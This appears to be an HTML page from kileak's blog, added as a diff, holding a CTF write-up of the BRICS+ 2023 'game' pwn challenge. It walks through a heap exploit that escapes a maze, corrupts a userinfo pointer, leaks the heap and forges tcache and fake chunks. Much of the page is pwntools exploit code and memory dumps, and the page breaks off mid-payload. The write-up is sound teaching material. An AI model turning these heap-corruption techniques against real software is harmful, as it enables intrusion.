@@ -1,0 +1,571 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title>BRICS+ CTF - game | kileak</title>
+
+
+
+
+
+<meta name="description" content="BRICS+ CTF - game">
+
+
+<meta name="keywords" content="brics, game">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2023/brics-game/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+  </head>
+  <body class="">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">BRICS+ CTF - game</h1>
+      <p class="post-meta">Sep 24, 2023</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>BRICS+ CTF - game
+<!--break--></p>
+
+  <p>Playing the Fool.</p>
+
+  <p>nc game-51463dfee2ff6388.brics-ctf.ru 13001</p>
+
+  <p>Team: Weak But Leet</p>
+
+  <p>Attachment: 
+<a href="https://kileak.github.io/assets/brics23/game/game.zip">game.zip</a> 
+<a href="https://kileak.github.io/assets/brics23/game/xpl.py">xpl.py</a></p>
+</blockquote>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">Name (24 chars max): AAAAAAAAAAAA
+1. Maze
+2. Cards
+3. User info
+4. Exit
+&gt; 1
+Use a s d w keys to move, you win when you reach any maze side
+
+Additional keys: 
+e - edit maze
+i - user info
+q - quit
+
+########
+#A ## A#
+# #  # #
+#@  #  #
+# #   ##
+#      #
+# # #  #
+###### #
+
+You now at 3 1 (you may not see '@' because of portal)</code></pre></figure>
+
+<p>In this challenge, we’re able to play a maze or card game. Though I used the card game merely to enlarge the heap when needed or triggering an allocation, the interesting part is in the maze game.</p>
+
+<p>The maze is stored on the heap (right below our user info object)</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x406290:	0x0000000000000000	0x0000000000000031
+0x4062a0:	0x0000000000000000	0x0000000000000001 &lt;= count of maze/card won/played
+0x4062b0:	0x0000000000000018	0x00000000004062d0 &lt;= size / name buffer
+0x4062c0:	0x0000000000000000	0x0000000000000031
+0x4062d0:	0x2020202020202020	0x2020202020202020 &lt;= name buffer
+0x4062e0:	0x2020202020202020	0x0000000000000000
+0x4062f0:	0x0000000000000000	0x0000000000000051
+0x406300:	0x2323232323232323	0x2341202323204123 &lt;= maze
+0x406310:	0x2320232020232023	0x2320202320204023
+0x406320:	0x2323202020232023	0x2320202020202023
+0x406330:	0x2320202320232023	0x2320232323232323
+0x406340:	0x0000000000000000	0x0000000000020cc1</code></pre></figure>
+
+<p>In most ctf maze games the target is to somehow leave the maze to access memory around it, so the objective was clear. Wasted some hours to leave it “in the wrong direction” and totally overcomplicated it (trying to resize card objects to free them multiple times, and so on…).</p>
+
+<p>But after a break and a fresh reset, I set my mind that it might be the best idea to keep the heap clean and simple and just leave the maze to the top, “wandering” into our user object. This turned out to be a lot easier.</p>
+
+<p>So, how to leave the maze without winning? Well, we can create a new maze with an empty space on top and place a portal inside the maze, which will warp us into this free space. When we then leave the portal to the north, the game will not recognize that we left the maze and lets us walk around outside of it.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="s">"</span><span class="se">\x20</span><span class="s">"</span><span class="o">*</span><span class="mi">24</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
+
+    <span class="n">maze</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="n">maze</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">"######## #######"</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
+        <span class="n">maze</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">"#              #"</span><span class="p">)</span>
+    <span class="n">maze</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">"######## ########"</span><span class="p">)</span>
+
+    <span class="n">go_maze</span><span class="p">()</span>
+    <span class="n">pause</span><span class="p">()</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Rewrite maze to get a teleporter to leave maze to north"</span><span class="p">)</span>
+    <span class="n">edit_maze</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="n">maze</span><span class="p">,</span> <span class="p">[</span><span class="s">"1 1 0 8"</span><span class="p">],</span> <span class="s">"2 1"</span><span class="p">)</span></code></pre></figure>
+
+<p>With this, we’ll create a <code class="language-plaintext highlighter-rouge">4*16</code> maze, which will fit nicely into a <code class="language-plaintext highlighter-rouge">0x50</code> chunk. Thus it will reuse (free/alloc) the existing maze. We also placed an open space at the middle of the top line and put a portal on <code class="language-plaintext highlighter-rouge">1/1</code>, which will warp into <code class="language-plaintext highlighter-rouge">0/8</code> (which is the open space).</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">########A#######
+#A             #
+#@             #
+######## #######
+
+You now at 2 1 (you may not see '@' because of portal)</code></pre></figure>
+
+<p>We’ll now walk through the portal and leave the maze and then walk into the <code class="language-plaintext highlighter-rouge">size</code> of <code class="language-plaintext highlighter-rouge">userinfo</code>.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Overwrite name size"</span><span class="p">)</span>
+<span class="n">go</span><span class="p">(</span><span class="s">"w"</span><span class="p">)</span>    <span class="c1"># walks into portal
+</span><span class="n">go</span><span class="p">(</span><span class="s">"w"</span><span class="p">)</span>    <span class="c1"># walks out of the maze
+</span><span class="n">go</span><span class="p">(</span><span class="s">"w"</span><span class="p">)</span>
+<span class="n">go</span><span class="p">(</span><span class="s">"w"</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
+    <span class="n">go</span><span class="p">(</span><span class="s">"a"</span><span class="p">)</span>
+<span class="n">go</span><span class="p">(</span><span class="s">"w"</span><span class="p">)</span>
+<span class="n">go</span><span class="p">(</span><span class="s">"w"</span><span class="p">)</span>         </code></pre></figure>
+
+<p>The player will be marked in the maze as <code class="language-plaintext highlighter-rouge">0x40</code> and since we “walked” onto the second byte of <code class="language-plaintext highlighter-rouge">size</code>, <code class="language-plaintext highlighter-rouge">size</code> will now have changed from <code class="language-plaintext highlighter-rouge">0x18</code> to <code class="language-plaintext highlighter-rouge">0x4018</code>.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x406290:	0x0000000000000000	0x0000000000000031
+0x4062a0:	0x0000000000000000	0x0000000000000001
+0x4062b0:	0x0000000000004018	0x00000000004062d0 &lt;= size / name buffer
+0x4062c0:	0x0000000000002000	0x0000000000000031
+0x4062d0:	0x2020202020202020	0x2020202020202020
+0x4062e0:	0x2020202020202020	0x0000000000000020
+0x4062f0:	0x0000000000000000	0x0000000000000051
+0x406300:	0x2323232323232323	0x2323232323232320
+0x406310:	0x2020202020204123	0x2320202020202020
+0x406320:	0x2020202020202023	0x2320202020202020
+0x406330:	0x2323232323232323	0x2323232323232320</code></pre></figure>
+
+<p>When we move around, we leave <code class="language-plaintext highlighter-rouge">0x20</code> bytes on our way (since the game wants to replace our previous position with a whitespace to draw the maze cleanly). So, by now, we would already be able to write a huge amount of data behind our <code class="language-plaintext highlighter-rouge">name buffer</code>, but it would be even nicer, if we could overwrite the <code class="language-plaintext highlighter-rouge">userinfo</code> object itself and point the name buffer anywhere.</p>
+
+<p>So currently it points to <code class="language-plaintext highlighter-rouge">0x4062d0</code>. If we’d just sneak around into the LSB of this, that would turn it into <code class="language-plaintext highlighter-rouge">0x406240</code>, pointing <em>before</em> our <code class="language-plaintext highlighter-rouge">userinfo</code> object.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">go</span><span class="p">(</span><span class="s">"s"</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
+  <span class="n">go</span><span class="p">(</span><span class="s">"d"</span><span class="p">)</span>
+
+<span class="n">go</span><span class="p">(</span><span class="s">"w"</span><span class="p">)</span>     </code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x406240:	0x0000000000000000	0x0000000000000000 &lt;= new fake buffer
+0x406250:	0x0000000000000000	0x0000000000000000
+0x406260:	0x0000000000000000	0x0000000000000000
+0x406270:	0x0000000000000000	0x0000000000000000
+0x406280:	0x0000000000000000	0x0000000000000000
+0x406290:	0x0000000000000000	0x0000000000000031
+0x4062a0:	0x0000000000000000	0x0000000000000001
+0x4062b0:	0x0000000000002018	0x0000000000406240 &lt;= size / name buffer
+0x4062c0:	0x2020202020202000	0x0000000000000020
+0x4062d0:	0x2020202020202020	0x2020202020202020
+0x4062e0:	0x2020202020202020	0x0000000000000020
+0x4062f0:	0x0000000000000000	0x0000000000000051</code></pre></figure>
+
+<p>Since lowest 3 nibbles of an address will always be the same, this will also work just fine, when we re-enable ASLR.</p>
+
+<p>With this setup, we can now change our name to align it with the name buffer address and then leak that with <code class="language-plaintext highlighter-rouge">Userinfo</code>.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="s">"y"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mh">0x78</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Name: "</span><span class="o">+</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x78</span><span class="p">)</span>
+<span class="n">LEAK</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+<span class="n">HEAPBASE</span> <span class="o">=</span> <span class="n">LEAK</span> <span class="o">-</span> <span class="mh">0x240</span></code></pre></figure>
+
+<p>Now, with a heap leak at hand, we can do even more with this primitive.</p>
+
+<p>Let’s point our buffer to <code class="language-plaintext highlighter-rouge">tcache arena</code>, so we can control allocation of chunks easily.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mh">0x78</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">HEAPBASE</span><span class="o">+</span><span class="mh">0x10</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"(y/n) : "</span><span class="p">,</span> <span class="s">"y"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>    
+<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Fillup heap to get enough chunks to free into bin"</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"(y/n) : "</span><span class="p">,</span> <span class="s">"y"</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span></code></pre></figure>
+
+<p>This will basically just clear out <code class="language-plaintext highlighter-rouge">tcache arena</code>. Thus all new allocations would come from <code class="language-plaintext highlighter-rouge">top</code>. We use this to enlarge the heap a bit, so that we can put a big fake chunk in it without much hassle.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">go_cards</span><span class="p">()</span>
+<span class="n">quit</span><span class="p">()</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"(y/n) : "</span><span class="p">,</span> <span class="s">"y"</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
+<span class="n">go_cards</span><span class="p">()</span>
+<span class="n">quit</span><span class="p">()</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"(y/n) : "</span><span class="p">,</span> <span class="s">"y"</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>   
+<span class="n">go_cards</span><span class="p">()</span>
+<span class="n">quit</span><span class="p">()</span></code></pre></figure>
+
+<p>Playing cards will allocate and free some <code class="language-plaintext highlighter-rouge">0x21</code> chunks. We do this multiple times, to push <code class="language-plaintext highlighter-rouge">top</code> down the heap.</p>
+
+<p>After this we’ll put a <code class="language-plaintext highlighter-rouge">0x480</code> fake chunk on the heap and let tcache <code class="language-plaintext highlighter-rouge">0x20</code> point to it. We’ll then allocate and free it via another card game, which will then pull a <code class="language-plaintext highlighter-rouge">main_arena</code> pointer onto the heap.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000001</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">HEAPBASE</span><span class="o">+</span><span class="mh">0x250</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
